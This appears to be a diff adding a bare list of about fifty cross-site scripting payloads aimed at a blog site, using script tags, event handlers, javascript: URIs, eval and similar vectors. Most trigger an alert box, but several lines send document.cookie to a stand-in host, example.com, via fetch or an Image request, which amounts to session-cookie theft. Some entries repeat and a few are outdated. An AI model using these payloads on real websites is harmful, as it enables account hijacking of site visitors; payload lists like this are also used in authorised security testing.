@@ -1,0 +1,50 @@
+<script>alert('XSS in Blog Site')</script>
+<img src="x" onerror="alert('XSS in Blog Site')">
+<a href="javascript:alert('XSS in Blog Site')">Click here</a>
+<div onmouseover="alert('XSS in Blog Site')">Hover over me</div>
+<input type="text" value="<script>alert('XSS in Blog Site')</script>">
+<iframe src="javascript:alert('XSS in Blog Site');"></iframe>
+<svg/onload=alert('XSS in Blog Site')>
+<script>document.location='javascript:alert("XSS in Blog Site")'</script>
+<form action="javascript:alert('XSS in Blog Site')"></form>
+<input type="button" value="Click me" onclick="alert('XSS in Blog Site')">
+<button onclick="alert('XSS in Blog Site')">Click me</button>
+<textarea onfocus="alert('XSS in Blog Site')"></textarea>
+<input type="text" value="<img src=x onerror=alert('XSS in Blog Site')>">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS in Blog Site')">
+<object data="javascript:alert('XSS in Blog Site')"></object>
+<audio src="javascript:alert('XSS in Blog Site')"></audio>
+<input type="image" src="x" onerror="alert('XSS in Blog Site')">
+<script>setTimeout('alert("XSS in Blog Site")', 100)</script>
+<script>window.alert('XSS in Blog Site');</script>
+<form action="javascript:alert('XSS in Blog Site')" method="POST"></form>
+<a href="javascript:document.location='javascript:alert(1)'">Go to Page</a>
+<textarea onblur="alert('XSS in Blog Site')"></textarea>
+<script>var img = new Image(); img.src = "http://example.com?cookie=" + document.cookie;</script>
+<script>document.body.innerHTML = '<img src=x onerror=alert("XSS in Blog Site")>';</script>
+<script>new Image().src='javascript:alert("XSS in Blog Site")'</script>
+<script>fetch('http://example.com?cookie=' + document.cookie)</script>
+<script>window.location="javascript:alert('XSS in Blog Site')"</script>
+<form action="javascript:alert('XSS in Blog Site')" method="POST"></form>
+<input onfocus="alert('XSS in Blog Site')" autofocus>
+<video onplay="alert('XSS in Blog Site')"></video>
+<button onclick="location='javascript:alert(2)'">Click Me</button>
+<textarea onfocus="alert('XSS in Blog Site')"></textarea>
+<input type="button" value="Test" onclick="location='javascript:alert(3)'">
+<script>document.body.innerHTML = '<iframe src="javascript:alert(\'XSS in Blog Site\')"></iframe>';</script>
+<img src="javascript:alert('XSS in Blog Site')" onerror="alert('XSS in Blog Site')">
+<input type="text" value="Blog <img src='x' onerror='alert(1)'>">
+<script>eval('alert(document.cookie)')</script>
+<input type="file" onchange="alert('XSS in Blog Site')">
+<script>eval('alert("XSS in Blog Site")')</script>
+<object data="javascript:alert('XSS in Blog Site')"></object>
+<style>@import 'javascript:alert(1)';</style>
+<script>window.location='javascript:alert("XSS in Blog Site")'</script>
+<script>eval('alert("XSS in Blog Site")')</script>
+<input type="text" value="Blog <svg><script>alert('XSS in Blog Site')</script></svg>">
+<script>setTimeout('alert("XSS in Blog Site")', 5000)</script>
+<input type="text" value="<img src='x' onerror='alert("XSS in Blog Site")'>">
+<script>document.body.innerHTML = '<input type="button" value="Test" onclick="alert(\'XSS in Blog Site\')">';</script>
+<script>fetch('http://example.com?cookie=' + document.cookie)</script>
+<script>document.body.innerHTML = '<button onclick="alert(\'XSS in Blog Site\')">Click Me</button>';</script>
+<img src="x" onerror="this.src='http://example.com/evil.jpg'">
